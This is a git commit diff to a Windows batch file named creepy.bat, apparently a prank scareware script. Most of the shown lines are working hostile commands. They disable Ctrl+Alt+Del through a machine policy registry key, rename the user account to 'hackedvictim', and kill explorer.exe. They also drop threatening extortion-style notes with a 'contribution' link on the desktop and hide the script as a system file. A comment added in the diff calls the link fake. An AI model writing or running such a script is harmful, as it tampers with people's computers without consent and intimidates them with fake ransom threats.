2db558f8a64648a6a61d848dbbe7ec47d78db7b3
Bradenyolo <lebronbraden52@gmail.com>
2022-11-26 11:37:44 -0600

    Update creepy.bat

--- trash/creepy.bat
+++ trash/creepy.bat
@@ -3,8 +3,10 @@
 
 :: setup registry keys before killing explorer
 reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableCAD /t REG_DWORD /d 1
+
 :: set username secretly and before killing explorer
 wmic useraccount where name='%username%' set FullName='hackedvictim'
+
 taskkill /f /im explorer.exe
 cls
 echo ----HACKER VIRUS----
@@ -32,6 +34,7 @@ echo 01010100 01101000 01100101 00100000 01000001 01110010 01100011 01101000 011
 echo You are our next target, %username%... because you will never get your computer and accounts back... and we will do something bad to both of those things so be ready for your work to all be gone... archer hackers are happy! (:... and also we will say something to you, %username%... you know you have been hacked by Archer Hackers right? well you need to contribute to our team or else we will use your location for fun... (: so do it quick! > %userprofile%\desktop\ARCHERHACKERSDATA\note.txt
 echo We will meet you soon, in 10 minutes, %username%... so always contribute to the Archer Hackers team fast, but here is a quick note: You will be a never forgotten victim of ours... > %userprofile%\desktop\ARCHERHACKERSDATA\remembertokeep.txt
 echo Heres the link to contribute: https://ahakers.com/contrib/victim > %userprofile%\desktop\ARCHERHACKERSDATA\contrib.txt
+:: DONT LISTEN TO THEM THIS IS FAKE LINK!!!
 attrib +s +h %userprofile%\desktop\creepy.bat
 echo Do you want to restart your computer? :)
 pause
